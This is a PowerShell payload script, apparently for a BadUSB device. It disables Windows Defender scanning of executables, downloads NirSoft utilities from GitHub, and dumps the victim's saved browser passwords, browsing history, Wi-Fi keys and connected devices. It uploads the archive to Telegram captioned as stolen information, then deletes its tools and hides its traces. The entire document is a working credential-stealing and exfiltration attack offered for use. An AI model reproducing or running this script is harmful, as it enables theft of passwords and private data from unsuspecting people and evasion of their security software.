Set-Location C:\Users\Public\Documents 
Add-MpPreference -ExclusionExtension exe -Force 
mkdir dump 
Invoke-WebRequest https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/upload/fin_upload.ps1 -OutFile fin_upload.ps1 
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe 
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe 
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe 
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe 
Invoke-WebRequest 'https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/upload/fin_upload.ps1' -OutFile fin_upload.ps1
.\WebBrowserPassView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt #Create the file for Browser passwords
.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_history.txt #Create the file for Browser history
.\WirelessKeyView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_wifi.txt #Create the file for WiFi passwords
.\WNetWatcher.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_connected_devices.txt #Create the file for connected devices
Start-Sleep -Seconds 60 #Wait for 60 seconds (because connected devices file take a minute to be created)
Move-Item -Path "$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt", "$env:USERNAME-$(get-date -f yyyy-MM-dd)_history.txt", "$env:USERNAME-$(get-date -f yyyy-MM-dd)_wifi.txt", "$env:USERNAME-$(get-date -f yyyy-MM-dd)_connected_devices.txt" -Destination dump/
Compress-Archive dump/ dump.zip #Compress dump/ folder to upload it on telegram
./telegram_uploader.exe -f dump.zip -c "Here are all stolen informations !" #Upload dump.zip on telegram
Start-Sleep -Seconds 15 #Wait 15 seconds
Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process #Kill all powershell process except the one running
Start-Sleep -Seconds 30 #Wait 30 seconds
#Delete nirsoft tools and .ps1 file
Remove-Item BrowsingHistoryView.exe
Remove-Item WNetWatcher.exe
Remove-Item WNetWatcher.cfg
Remove-Item WirelessKeyView.exe
Remove-Item WebBrowserPassView.exe
Remove-Item ciaoV2_upload.ps1
Remove-Item telegram_uploader.exe
#Enable and disable capslock to know when you can eject BadUSB
$keyBoardObject = New-Object -ComObject WScript.Shell
$keyBoardObject.SendKeys("{CAPSLOCK}")
Start-Sleep -Seconds 1 #Wait 2 seconds
$keyBoardObject.SendKeys("{CAPSLOCK}")
Start-Sleep -Seconds 1 #Wait 2 seconds
$keyBoardObject.SendKeys("{CAPSLOCK}")
Start-Sleep -Seconds 1 #Wait 2 seconds
$keyBoardObject.SendKeys("{CAPSLOCK}")
Remove-MpPreference -ExclusionExtension exe -Force #Reset antivirus exception
powershell.exe -noexit -windowstyle hidden -file fin_upload.ps1 #Start final .ps1 file to delete all .txt files (because in this .ps1 .txt files are considerated in-use
exit #End .ps1 file

